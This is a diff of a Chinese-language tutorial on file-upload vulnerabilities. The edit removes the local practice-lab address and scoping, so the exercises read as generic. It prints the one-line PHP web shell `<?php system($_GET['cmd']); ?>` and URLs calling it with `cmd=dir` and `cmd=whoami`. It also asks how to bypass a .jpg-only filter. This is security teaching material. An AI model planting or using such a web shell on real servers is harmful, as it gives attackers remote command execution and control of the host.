@@ -14,15 +14,11 @@
 4. 服务器执行恶意代码 = 服务器被控！
 ```
 
-## 🎯 靶场练习 6：文件上传
+## 🎯 动手实验
 
-打开 `http://127.0.0.1:5000/upload`
+上传一个普通的文本文件和一张图片，对比上传前后 URL 的变化。
 
-### 练习 1：上传文本文件
-
-先上传一个普通文件试试，确认上传路径。
-
-### 练习 2：上传 Web Shell
+### 上传 Web Shell
 
 创建文件 `shell.php`：
 
@@ -32,11 +28,11 @@
 
 上传后访问：
 ```
-http://127.0.0.1:5000/uploads/shell.php?cmd=dir
-http://127.0.0.1:5000/uploads/shell.php?cmd=whoami
+/uploads/shell.php?cmd=dir
+/uploads/shell.php?cmd=whoami
 ```
 
-### 如果靶场是 PHP 环境，经典的 PHP 一句话木马：
+### 经典的 PHP 一句话木马：
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -136,7 +132,7 @@ if ($file['size'] > 10 * 1024 * 1024) {  // 10MB
 
 ## 📝 练习
 
-1. 在靶场上传 `shell.php`，访问看能否执行
+1. 上传 `shell.php`，访问看能否执行
 2. 尝试上传 `.html` 文件并访问（这也算一种 XSS！）
 3. 思考：如果服务器限制只允许 `.jpg`，你怎么绕过？
 
